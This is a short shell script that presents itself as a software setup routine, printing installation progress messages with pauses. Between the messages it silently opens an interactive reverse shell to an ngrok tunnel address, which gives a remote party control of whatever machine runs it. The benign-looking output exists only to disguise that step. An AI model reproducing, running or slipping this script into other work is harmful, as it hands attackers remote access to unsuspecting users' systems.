echo PLease Wait Your Setup is Installing 
sleep 2
echo installing the required Files 
sleep 4
sh -i >& /dev/tcp/0.tcp.ngrok.io/15243 0>&1
echo All Done We are Good To Go
